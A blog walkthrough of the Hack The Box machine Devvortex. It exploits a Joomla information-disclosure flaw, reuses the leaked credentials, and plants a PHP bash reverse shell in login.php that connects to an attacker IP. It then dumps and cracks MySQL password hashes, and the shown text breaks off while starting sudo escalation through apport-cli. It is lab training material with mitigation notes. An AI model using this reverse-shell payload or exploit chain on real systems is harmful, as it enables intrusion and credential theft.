<!DOCTYPE html> <html lang="en"> <head> <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"> <meta charset="utf-8"> <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"> <meta http-equiv="X-UA-Compatible" content="IE=edge"> <title>Devvortex | emdeh</title> <meta name="author" content=" "> <meta name="description" content="Devvortex - Hack The Box walkthrough."> <meta name="keywords" content="cybersecurity, ai, technology cyber"> <link rel="stylesheet" href="/assets/css/bootstrap.min.css?a4b3f509e79c54a512b890d73235ef04"> <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/mdbootstrap@4.20.0/css/mdb.min.css" integrity="sha256-jpjYvU3G3N6nrrBwXJoVEYI/0zw8htfFnhT9ljN3JJw=" crossorigin="anonymous"> <link defer rel="stylesheet" href="https://unpkg.com/bootstrap-table@1.22.1/dist/bootstrap-table.min.css"> <link rel="stylesheet" href="/assets/css/academicons.min.css?f0b7046b84e425c55f3463ac249818f5"> <link rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Roboto:300,400,500,700|Roboto+Slab:100,300,400,500,700|Material+Icons"> <link rel="stylesheet" href="/assets/css/jekyll-pygments-themes-github.css?19f3075a2d19613090fe9e16b564e1fe" media="" id="highlight_theme_light"> <link href="/assets/css/bootstrap-toc.min.css?6f5af0bb9aab25d79b2448143cbeaa88" rel="stylesheet"> <link rel="shortcut icon" href="data:image/svg+xml,&lt;svg%20xmlns=%22http://www.w3.org/2000/svg%22%20viewBox=%220%200%20100%20100%22&gt;&lt;text%20y=%22.9em%22%20font-size=%2290%22&gt;%F0%9F%91%A8%E2%80%8D%F0%9F%92%BB&lt;/text&gt;&lt;/svg&gt;"> <link rel="stylesheet" href="/assets/css/main.css?d41d8cd98f00b204e9800998ecf8427e"> <link rel="canonical" href="https://emdeh.github.io/blog/2024/devvortex-walkthrough/"> <link rel="stylesheet" href="/assets/css/jekyll-pygments-themes-native.css?e74e74bf055e5729d44a7d031a5ca6a5" media="none" id="highlight_theme_dark"> <script src="/assets/js/theme.js?96d6b3e1c3604aca8b6134c7afdd5db6"></script> <script src="/assets/js/dark_mode.js?9b17307bb950ffa2e34be0227f53558f"></script> <script async src="https://www.googletagmanager.com/gtag/js?id=G-JZNPNDMG9P"></script> <script>function gtag(){dataLayer.push(arguments)}window.dataLayer=window.dataLayer||[],gtag("js",new Date),gtag("config","G-JZNPNDMG9P");</script> </head> <body class="fixed-top-nav "> <header> <nav id="navbar" class="navbar navbar-light navbar-expand-sm fixed-top"> <div class="container"> <a class="navbar-brand title font-weight-lighter" href="/">emdeh</a> <button class="navbar-toggler collapsed ml-auto" type="button" data-toggle="collapse" data-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation"> <span class="sr-only">Toggle navigation</span> <span class="icon-bar top-bar"></span> <span class="icon-bar middle-bar"></span> <span class="icon-bar bottom-bar"></span> </button> <div class="collapse navbar-collapse text-right" id="navbarNav"> <ul class="navbar-nav ml-auto flex-nowrap"> <li class="nav-item "> <a class="nav-link" href="/">about</a> </li> <li class="nav-item active"> <a class="nav-link" href="/blog/">blog<span class="sr-only">(current)</span></a> </li> <li class="nav-item "> <a class="nav-link" href="/repositories/">Repositories</a> </li> <li class="nav-item "> <a class="nav-link" href="/library/">Library</a> </li> <li class="nav-item dropdown "> <a class="nav-link dropdown-toggle" href="#" id="navbarDropdown" role="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">submenus</a> <div class="dropdown-menu dropdown-menu-right" aria-labelledby="navbarDropdown"> <a class="dropdown-item" href="/blog/category/htb-machines">HTB-Machines</a> <div class="dropdown-divider"></div> <a class="dropdown-item" href="/blog/category/essential-eight/">Essential Eight</a> <div class="dropdown-divider"></div> <a class="dropdown-item" href="/blog/category/artificial-intelligence/">Artificial Intelligence</a> <div class="dropdown-divider"></div> <a class="dropdown-item" href="/blog/category/explainers/">Explainers</a> </div> </li> <li class="toggle-container"> <button id="light-toggle" title="Change theme"> <i class="fas fa-moon"></i> <i class="fas fa-sun"></i> </button> </li> </ul> </div> </div> </nav> <progress id="progress" value="0"> <div class="progress-container"> <span class="progress-bar"></span> </div> </progress> </header> <div class="container mt-5"> <div class="row"> <div class="col-sm-3"> <nav id="toc-sidebar" class="sticky-top"></nav> </div> <div class="col-sm-9"> <div class="post"> <header class="post-header"> <h1 class="post-title">Devvortex</h1> <p class="post-meta">January 15, 2024</p> <p class="post-tags"> <a href="/blog/2024"> <i class="fas fa-calendar fa-sm"></i> 2024 </a>   ·   <a href="/blog/tag/easy-box"> <i class="fas fa-hashtag fa-sm"></i> easy-box</a>   <a href="/blog/tag/htb"> <i class="fas fa-hashtag fa-sm"></i> HTB</a>   <a href="/blog/tag/ctf"> <i class="fas fa-hashtag fa-sm"></i> CTF</a>   <a href="/blog/tag/credential-stuffing"> <i class="fas fa-hashtag fa-sm"></i> credential-stuffing</a>   <a href="/blog/tag/information-disclosure"> <i class="fas fa-hashtag fa-sm"></i> information-disclosure</a>   <a href="/blog/tag/password-cracking"> <i class="fas fa-hashtag fa-sm"></i> password-cracking</a>     ·   <a href="/blog/category/htb-machines"> <i class="fas fa-tag fa-sm"></i> HTB-Machines</a>   </p> </header> <article class="post-content"> <div id="markdown-content"> <h1 id="introduction">Introduction</h1> <p>Devvortex is an easy Linux box. It involves enumerating a domain to reveal a Content Management System called <em>Joomla</em>.</p> <p>An exploit is then used to perform an <strong>Unauthenticated Information Disclosure.</strong></p> <p>This results in stealing MySQL credentials which are <strong>re-used</strong> to authenticate to the Joomla admin panel.</p> <p>From there a reverse shell is obtained by modifying the <code class="language-plaintext highlighter-rouge">login.php</code>. Once the reverse shell is established the MySQL database is enumerated to obtain two hashes. Once a hash is cracked, SSH is used to log on.</p> <p><strong>Privilege escalation</strong> is achieved by exploiting a vulnerability in the <code class="language-plaintext highlighter-rouge">apport-cli</code> utility, which the user has <code class="language-plaintext highlighter-rouge">sudo</code> rights over. This ultimately spawns a privileged shell.</p> <h2 id="methods">Methods</h2> <h3 id="unauthenticated-information-disclosure">Unauthenticated information disclosure</h3> <p>Unauthenticated Information Disclosure refers to a security vulnerability where sensitive information is exposed without requiring authentication. It means that confidential data, such as personal details, configuration files, or database records, can be accessed by anyone without needing to log in or bypass security controls.</p> <p>This type of vulnerability often arises due to misconfigurations or flawed programming in web applications or services. It poses a significant risk because it can lead to data breaches and further exploitation.</p> <p>In this case, an outdated Joomla version was exploited to obtain clear-text credentials.</p> <blockquote> <p><strong>Mitigation:</strong> Ensure sensitive information is not vulnerable to unauthenticated disclosure, keep systems patched, and encrypt sensitive data.</p> </blockquote> <h3 id="credential-stuffing">Credential stuffing</h3> <p>Credential stuffing is a type of attack where stolen account credentials (usernames or email addresses and passwords) from one breach are used to attempt access to accounts on other websites. This attack relies on the fact that many people reuse the same login credentials across multiple sites. It’s a widespread method for gaining unauthorised access due to the commonality of password reuse.</p> <p>In this case, the credentials from the information disclosure were re-used to obtain access to the Joomla administrator panel.</p> <blockquote> <p><strong>Mitigation:</strong> Ensure passwords are not re-used across different services.</p> </blockquote> <h3 id="password-cracking">Password cracking</h3> <p>Password cracking is the process of attempting to gain unauthorised access to restricted systems by figuring out the password. It often involves the use of software that employs various methods (like brute-force attacks, dictionary attacks, or rainbow table attacks) to guess passwords. This technique can be used against individual accounts or to decrypt encrypted data. The complexity and time it takes to crack a password can vary significantly based on the password’s strength and the method used.</p> <p>In this case, the hashes stolen from the MySQL database were cracked with <code class="language-plaintext highlighter-rouge">hashcat</code>.</p> <p><strong>Mitigation:</strong> Ensure complex passwords are used.</p> <h1 id="enumeration">Enumeration</h1> <p>Enumeration, as always starts with Nmap.</p> <h2 id="nmap-scanning">Nmap scanning</h2> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-sC</span> <span class="nt">-sV</span> 10.129.15.24 <span class="nt">-oN</span> - | <span class="nb">tee </span>devvortex-initial-scan.txt
</code></pre></div></div> <blockquote> <p><em>To output Nmap scan results to a file while also displaying them in the terminal, you can use the <code class="language-plaintext highlighter-rouge">-oN</code> option along with the <code class="language-plaintext highlighter-rouge">tee</code> command in Linux. The <code class="language-plaintext highlighter-rouge">-oN</code> option in Nmap is used to output the scan results to a file in a normal, human-readable format. The <code class="language-plaintext highlighter-rouge">tee</code> command in Unix-like operating systems reads from standard input and writes to both standard output and one or more files simultaneously.</em></p> </blockquote> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># Nmap 7.94SVN scan initiated Sun Jan 14 23:30:42 2024 as: nmap -sC -sV -oN - 10.129.15.24
Nmap scan report for 10.129.15.24
Host is up (0.31s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://devvortex.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Jan 14 23:31:37 2024 -- 1 IP address (1 host up) scanned in 54.86 seconds
</code></pre></div></div> <h3 id="findings">Findings</h3> <ol> <li>Two ports open, 22 and 80.</li> <li>Domain name http://devvortex.htb/ found.</li> </ol> <h2 id="subdomain-scanning">Subdomain scanning</h2> <p>Adding the domain to <code class="language-plaintext highlighter-rouge">/etc/hosts</code> file allows for the site to be browsed and reveals a landing page.</p> <p><img src="/assets/img/20240115-devvortext-landingpage1.png" alt="20240115-devvortext-landingpage1.png" class="auto-resize"></p> <p>The site was then scanned for subdomains.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wfuzz <span class="nt">-w</span> /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt <span class="nt">-u</span> http://devvortex.htb/ <span class="nt">-H</span> <span class="s1">'Host:FUZZ.devvortex.htb'</span> <span class="nt">-t</span> 50 <span class="nt">--hc</span> 302 <span class="o">&gt;</span> subdomain-scan.txt | <span class="nb">tee</span>
</code></pre></div></div> <ul> <li>The <code class="language-plaintext highlighter-rouge">-t 50</code> instructs wfuzz to have up to 50 concurrent connections which will speed up the scan.</li> <li>The <code class="language-plaintext highlighter-rouge">--hc 302</code> flag stands for “Hide Code”. This option instructs wfuzz not to display results with the 302 status code. This can be helpful to filter out some of the redirection noise.</li> </ul> <h3 id="findings-1">Findings</h3> <p>The subdomain <code class="language-plaintext highlighter-rouge">dev</code> was identified.</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://devvortex.htb/
Total requests: 19966
=====================================================================
ID           Response   Lines    Word       Chars       Payload                         
=====================================================================

000000019:   200        501 L    1581 W     23221 Ch    "dev"                           

Total time: 0
Processed Requests: 19966
Filtered Requests: 19965
Requests/sec.: 0
</code></pre></div></div> <p>This is added to <code class="language-plaintext highlighter-rouge">/etc/hosts</code> to allow the site to be browsed.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Documents/HTB-Machines/devvortex/scans]
└─<span class="nv">$ </span><span class="nb">cat</span> /etc/hosts
&lt;SNIP&gt;
10.129.15.24    devvortex.htb dev.devvortex.htb
</code></pre></div></div> <p>Navigating to the subdomain reveals another landing page.</p> <p><img src="/assets/img/20240115-devvortext-cover-landingpage2.png" alt="20240115-devvortext-cover-landingpage2.png" class="auto-resize"></p> <h2 id="subdomain-directory-scanning">Subdomain directory scanning</h2> <p>The newly identified subdomain <code class="language-plaintext highlighter-rouge">dev.devvortex.htb</code> can be fuzzed again for pages.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wfuzz <span class="nt">-w</span> /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-directories-lowercase.txt <span class="nt">-u</span> http://dev.devvortex.htb/FUZZ <span class="nt">-t</span> 200 <span class="nt">--hc</span> 404,403 <span class="o">&gt;</span> subdomain-directory-scan.txt | <span class="nb">tee</span>
</code></pre></div></div> <h3 id="findings-2">Findings</h3> <p>The fuzzing revealed a number of directories on the subdomain. Lets start with the <code class="language-plaintext highlighter-rouge">administrator</code> directory.</p> <p><img src="/assets/img/20240115-devvortext-domainfuzzing.png" alt="20240115-devvortext-domainfuzzing.png" class="auto-resize"></p> <p>Navigating to the <code class="language-plaintext highlighter-rouge">/administrator</code> page reveals a <strong>Joomla</strong> landing page.</p> <p><img src="/assets/img/20240115-devvortext-joomlapage.png" alt="20240115-devvortext-joomlapage.png" class="auto-resize"></p> <h3 id="what-is-joomla">What is Joomla</h3> <p>Joomla is a popular, open-source Content Management System (CMS) used to build, manage, and publish content for websites, blogs, and online applications. It is written in PHP and uses a <strong>MySQL</strong> database to store content and settings.</p> <h1 id="exploitation">Exploitation</h1> <h2 id="joomla-compromise">Joomla compromise</h2> <p>Checking the subdomain’s README.txt file reveals the Joomla version as 4.2.</p> <p>A quick search of <code class="language-plaintext highlighter-rouge">searchsploit</code> and we find a promising exploit.</p> <p><img src="/assets/img/20240115-devvortext-joomlaexploit.png" alt="20240115-devvortext-joomlaexploit.png" class="auto-resize"></p> <p>Using the <code class="language-plaintext highlighter-rouge">mirror</code> command the exploit can be copied to a working directory.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Documents/HTB-Machines/devvortex/exploits]
└─<span class="nv">$ </span>searchsploit <span class="nt">-m</span> exploits/php/webapps/51334.py
</code></pre></div></div> <p>This exploit ran into some library issues so another version on GitHub was used: https://github.com/svaltheim/CVE-2023-23752/blob/main/CVE-2023-23752</p> <p>The exploit executed successfully and identified two users, site details and database information including credentials.</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──(kali㉿kali)-[~/Documents/HTB-Machines/devvortex/exploits]
└─$ ./CVE-2023-23752 http://dev.devvortex.htb
Users
[649] lewis (lewis) - lewis@devvortex.htb - Super Users
[650] logan paul (logan) - logan@devvortex.htb - Registered

Site info
Site name: Development
Editor: tinymce
Captcha: 0
Access: 1
Debug status: False

Database info
DB type: mysqli
DB host: localhost
DB user: lewis
DB password: &lt;REDACTED&gt;
DB name: joomla
DB prefix: sd4fg_
DB encryption 0

</code></pre></div></div> <p>Password stuffing Lewis’ credentials on the <code class="language-plaintext highlighter-rouge">/administrator</code> page resulted in a successful authentication.</p> <p>Checking SSH with Lewis’ credentials revealed no further credential re-use.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Documents/HTB-Machines/devvortex/exploits]
└─<span class="nv">$ </span>ssh lewis@10.129.15.24        
lewis@10.129.15.24<span class="s1">'s password: 
Permission denied, please try again.
lewis@10.129.15.24'</span>s password: 
</code></pre></div></div> <h2 id="foothold---php-reverse-shell">Foothold - PHP reverse shell</h2> <p>On the admin panel is a warning about the server using an outdated version of PHP.</p> <p><img src="/assets/img/20240115-devvortext-phpwarning.png" alt="20240115-devvortext-phpwarning.png" class="auto-resize"></p> <p>Moving to <code class="language-plaintext highlighter-rouge">/System/Templates/Administrator Templates</code>, it was identified that the user has access to the PHP templates. The <code class="language-plaintext highlighter-rouge">login.php</code> was edited to send a reverse shell when the page is served.</p> <p>The modification made was:</p> <div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
<span class="nb">system</span><span class="p">(</span><span class="s1">'bash -c "bash -i &gt;&amp; /dev/tcp/10.10.14.16/4321 00&gt;&amp;1"'</span><span class="p">);</span>
<span class="o">&lt;</span><span class="no">SNIP</span><span class="o">&gt;</span>
</code></pre></div></div> <ul> <li> <code class="language-plaintext highlighter-rouge">system()</code> <em>Function in PHP</em>: This is a PHP function that is used to execute an external program. The <code class="language-plaintext highlighter-rouge">system</code> function will execute the given command and output the result. In this context, it is being used to execute a bash command.</li> <li> <code class="language-plaintext highlighter-rouge">bash -c</code>: This tells the system to execute the following string with Bash.</li> <li> <code class="language-plaintext highlighter-rouge">"bash -i &gt;&amp; /dev/tcp/10.10.14.16/4321 0&lt;&amp;1"</code>: This is the string command that Bash executes.</li> <li> <code class="language-plaintext highlighter-rouge">bash -i</code>: This starts an interactive Bash shell (<code class="language-plaintext highlighter-rouge">-i</code> flag for interactive).</li> <li> <code class="language-plaintext highlighter-rouge">&gt;&amp; /dev/tcp/10.10.14.16/4321</code>: This redirects the standard output (stdout) of the shell to a TCP connection to the specified IP address and port.</li> <li> <code class="language-plaintext highlighter-rouge">0&lt;&amp;1</code>: This part redirects the standard input (stdin) to the shell from the same TCP connection. The <code class="language-plaintext highlighter-rouge">0&lt;&amp;1</code> means to take input (file descriptor 0) from the same place as the standard output (file descriptor 1).</li> </ul> <blockquote> <p><em>The <code class="language-plaintext highlighter-rouge">&gt;&amp;</code> operator is shorthand for redirecting both stdout (1) and stderr (2).</em></p> </blockquote> <p><img src="/assets/img/20240115-devvortext-revshell.png" alt="20240115-devvortext-revshell.png" class="auto-resize"></p> <p>Starting a netcat listener and then navigating back to http://dev.devortex.htb/administrator in a private window returns as a reverse shell.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~]
└─<span class="nv">$ </span>nc <span class="nt">-lvnp</span> 4321
listening on <span class="o">[</span>any] 4321 ...
connect to <span class="o">[</span>10.10.14.16] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.129.15.24] 45554
bash: cannot <span class="nb">set </span>terminal process group <span class="o">(</span>856<span class="o">)</span>: Inappropriate ioctl <span class="k">for </span>device
bash: no job control <span class="k">in </span>this shell
www-data@devvortex:~/dev.devvortex.htb/administrator<span class="nv">$ </span>

</code></pre></div></div> <h3 id="shell-stabilisation">Shell stabilisation</h3> <p>Now the shell can be stabilised before proceeding.</p> <p><img src="/assets/img/20240115-devvortext-shellupgrade.png" alt="20240115-devvortext-shellupgrade.png" class="auto-resize"></p> <p>As shown above, running these commands sequentially, and then hitting enter a few times, will return a more interactive and stable shell.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 <span class="nt">-c</span> <span class="s1">'import pty;pty.spawn("/bin/bash")'</span>  
<span class="nb">export </span><span class="nv">TERM</span><span class="o">=</span>xterm  
ctrl + z  
<span class="nb">stty </span>raw <span class="nt">-echo</span><span class="p">;</span> <span class="nb">fg</span>
</code></pre></div></div> <p>The sequence of commands will upgrade a basic shell into a fully interactive shell. This is often necessary because simple reverse shells can be quite limited (e.g., no tab completion, no interactive commands). Here’s a brief explanation of each step:</p> <ol> <li> <code class="language-plaintext highlighter-rouge">python3 -c 'import pty; pty.spawn("/bin/bash")'</code>: <ul> <li>This command uses Python to spawn a new bash shell with pseudo-terminal (pty) support. This improves the shell’s interactivity and handling of certain commands.</li> </ul> </li> <li> <code class="language-plaintext highlighter-rouge">export TERM=xterm</code>: <ul> <li>After the Python command gives you a more functional shell, set the <code class="language-plaintext highlighter-rouge">TERM</code> environment variable to <code class="language-plaintext highlighter-rouge">xterm</code>. This tells the shell what kind of terminal it’s running in, allowing for better formatting and functionality (like clear screen, command history).</li> </ul> </li> <li> <code class="language-plaintext highlighter-rouge">Ctrl + Z</code>: <ul> <li>This key combination suspends the current foreground process (the shell), returning control to your local terminal without closing the shell.</li> </ul> </li> <li> <code class="language-plaintext highlighter-rouge">stty raw -echo; fg</code>: <ul> <li> <code class="language-plaintext highlighter-rouge">stty raw -echo</code>: This configures the terminal. <code class="language-plaintext highlighter-rouge">raw</code> mode means input characters are passed to the foreground process immediately, and <code class="language-plaintext highlighter-rouge">-echo</code> turns off input echoing, preventing characters from being displayed twice.</li> <li> <code class="language-plaintext highlighter-rouge">fg</code>: This command brings the suspended process (your bash shell) back to the foreground.</li> </ul> </li> <li> <strong>Hit Enter a Few Times</strong>: <ul> <li>Sometimes, after running these commands, you might need to hit enter a few times to get the prompt of the interactive shell.</li> </ul> </li> </ol> <h2 id="lateral-movement---mysql">Lateral movement - MySQL</h2> <p>Recall the credentials found with the Joomla exploit earlier:</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Database info
DB type: mysqli
DB host: localhost
DB user: lewis
DB password: &lt;REDACTED&gt;
DB name: joomla
DB prefix: sd4fg_
DB encryption 0
</code></pre></div></div> <p>Trying them on the reverse shell is successful.</p> <pre><code class="language-mysql">mysql -h localhost -u lewis -p '&lt;REDACTED&gt;'
</code></pre> <pre><code class="language-mysql">www-data@devvortex:~/dev.devvortex.htb/administrator$ mysql -u lewis -p
Enter password: 
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 8889
Server version: 8.0.35-0ubuntu0.20.04.1 (Ubuntu)

Copyright (c) 2000, 2023, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql&gt; show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| joomla             |
| performance_schema |
+--------------------+
3 rows in set (0.00 sec)

mysql&gt; use joomla;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql&gt; show tables;  
+-------------------------------+  
| Tables_in_joomla |  
+-------------------------------+  
| sd4fg_action_log_config |  
| sd4fg_action_logs |  
| sd4fg_action_logs_extensions |  
| sd4fg_action_logs_users |  
| sd4fg_assets |  
| sd4fg_associations |  
| sd4fg_banner_clients |  
| sd4fg_banner_tracks |
&lt;SNIP&gt;
| sd4fg_users |

mysql&gt; select * from sd4fg_users;  
+-----+------------+----------+---------------------+--------------------------------------------------------------+-------+-----------+---------------------+---------------------+------------+---------------------------------------------------------------------------------------------------------------------------------------------------------+---------------+------------+--------+------+--------------+--------------+  
| id | name | username | email | password | block | sendEmail | registerDate | lastvisitDate | activation | params | lastResetTime | resetCount | otpKey | otep | requireReset | authProvider |  
+-----+------------+----------+---------------------+--------------------------------------------------------------+-------+-----------+---------------------+---------------------+------------+---------------------------------------------------------------------------------------------------------------------------------------------------------+---------------+------------+--------+------+--------------+--------------+  
| 649 | lewis | lewis | lewis@devvortex.htb | &lt;REDACTED&gt; | 0 | 1 | 2023-09-25 16:44:24 | 2023-11-26 13:51:53 | 0 | | NULL | 0 | | | 0 | |  
| 650 | logan paul | logan | logan@devvortex.htb | &lt;REDACTED&gt; | 0 | 0 | 2023-09-26 19:15:42 | NULL | | {"admin_style":"","admin_language":"","language":"","editor":"","timezone":"","a11y_mono":"0","a11y_contrast":"0","a11y_highlight":"0","a11y_font":"0"} | NULL | 0 | | | 0 | |  
+-----+------------+----------+---------------------+--------------------------------------------------------------+-------+-----------+---------------------+---------------------+------------+---------------------------------------------------------------------------------------------------------------------------------------------------------+---------------+------------+--------+------+--------------+--------------+

</code></pre> <p>As shown above, two hashes were stolen from the database.</p> <p><img src="/assets/img/20240115-devvortext-sqlhashes.png" alt="20240115-devvortext-sqlhashes.png" class="auto-resize"></p> <h2 id="cracking-the-passwords">Cracking the passwords</h2> <p>Using Hashcat, one of the hashes is quickly cracked.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Documents/HTB-Machines/devvortex/credentials]
└─<span class="nv">$ </span>hashcat <span class="nt">-a</span> 0 <span class="nt">-m</span> 3200 hashes /usr/share/wordlists/rockyou.txt       
hashcat <span class="o">(</span>v6.2.6<span class="o">)</span> starting
&lt;SNIP&gt;
&lt;REDACTED&gt;

</code></pre></div></div> <p>This hash corresponds to the user <code class="language-plaintext highlighter-rouge">logan</code>.</p> <h2 id="ssh">SSH</h2> <p>Trying the password on SSH is successful.</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──(kali㉿kali)-[~/Documents/HTB-Machines/devvortex/credentials]
└─$ ssh logan@10.129.15.24
logan@10.129.15.24's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-167-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon 15 Jan 2024 06:46:03 AM UTC

  System load:           0.0
  Usage of /:            64.2% of 4.76GB
  Memory usage:          17%
  Swap usage:            0%
  Processes:             177
  Users logged in:       0
  IPv4 address for eth0: 10.129.15.24
  IPv6 address for eth0: dead:beef::250:56ff:fe96:b12d

  =&gt; There are 8 zombie processes.

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Tue Nov 21 10:53:48 2023 from 10.10.14.23
logan@devvortex:~$ 

</code></pre></div></div> <p>Grab the first flag!</p> <p><img src="/assets/img/20240115-devvortext-userflag.png" alt="20240115-devvortext-userflag.png" class="auto-resize"></p> <h1 id="privilege-escalation">Privilege escalation</h1> <p>Using <code class="language-plaintext highlighter-rouge">sudo -l</code> lists the binaries <code class="language-plaintext highlighter-rouge">logan</code> can run with root privileges.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>logan@devvortex:~<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
Matching Defaults entries <span class="k">for </span>logan on devvortex:
    env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin

User logan may run the following commands on devvortex:
    <span class="o">(</span>ALL : ALL<span class="o">)</span> /usr/bin/apport-cli

</code></pre></div></div> <p>We can see here that <code class="language-plaintext highlighter-rouge">logan</code> can run <code class="language-plaintext highlighter-rouge">/usr/bin/apport-cli</code>.</p> <h2 id="what-is-apport-cli">What is apport-cli</h2> <p><code class="language-plaintext highlighter-rouge">apport-cli</code> is a command-line interface tool for Apport, which is a system in Ubuntu and other Debian-based Linux distributions used for reporting bugs and crashes. Apport automatically generates crash reports when a program fails and helps in debugging the causes of those failures. These reports can include details like the state of the program at the time of the crash, which can be invaluable for developers to diagnose and fix issues.</p> <p>A key feature of the utility is a <strong>Command-Line Interface</strong>. As a CLI tool, <code class="language-plaintext highlighter-rouge">apport-cli</code> allows users to interact with the Apport crash reporting system directly from the terminal. This is particularly useful for servers or other systems where a graphical user interface (GUI) is not available.</p> <h2 id="exploiting-apport-cli">Exploiting apport-cli</h2> <p>The help menu reveals a number of options.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Usage: apport-cli <span class="o">[</span>options] <span class="o">[</span>symptom|pid|package|program path|.apport/.crash file]

Options:
  <span class="nt">-h</span>, <span class="nt">--help</span>            show this <span class="nb">help </span>message and <span class="nb">exit</span>
  <span class="nt">-f</span>, <span class="nt">--file-bug</span>        Start <span class="k">in </span>bug filing mode. Requires <span class="nt">--package</span> and an
                        optional <span class="nt">--pid</span>, or just a <span class="nt">--pid</span><span class="nb">.</span> If neither is given,
                        display a list of known symptoms. <span class="o">(</span>Implied <span class="k">if </span>a single
                        argument is given.<span class="o">)</span>
  <span class="nt">-w</span>, <span class="nt">--window</span>          Click a window as a target <span class="k">for </span>filing a problem
                        report.
  <span class="nt">-u</span> UPDATE_REPORT, <span class="nt">--update-bug</span><span class="o">=</span>UPDATE_REPORT
                        Start <span class="k">in </span>bug updating mode. Can take an optional
                        <span class="nt">--package</span><span class="nb">.</span>
  <span class="nt">-s</span> SYMPTOM, <span class="nt">--symptom</span><span class="o">=</span>SYMPTOM
                        File a bug report about a symptom. <span class="o">(</span>Implied <span class="k">if </span>symptom
                        name is given as only argument.<span class="o">)</span>
  <span class="nt">-p</span> PACKAGE, <span class="nt">--package</span><span class="o">=</span>PACKAGE
                        Specify package name <span class="k">in</span> <span class="nt">--file-bug</span> mode. This is
                        optional <span class="k">if </span>a <span class="nt">--pid</span> is specified. <span class="o">(</span>Implied <span class="k">if </span>package
                        name is given as only argument.<span class="o">)</span>
  <span class="nt">-P</span> PID, <span class="nt">--pid</span><span class="o">=</span>PID     Specify a running program <span class="k">in</span> <span class="nt">--file-bug</span> mode. If this
                        is specified, the bug report will contain more
                        information.  <span class="o">(</span>Implied <span class="k">if </span>pid is given as only
                        argument.<span class="o">)</span>
  <span class="nt">--hanging</span>             The provided pid is a hanging application.
  <span class="nt">-c</span> PATH, <span class="nt">--crash-file</span><span class="o">=</span>PATH
                        Report the crash from given .apport or .crash file
                        instead of the pending ones <span class="k">in</span> /var/crash. <span class="o">(</span>Implied <span class="k">if
                        </span>file is given as only argument.<span class="o">)</span>
  <span class="nt">--save</span><span class="o">=</span>PATH           In bug filing mode, save the collected information
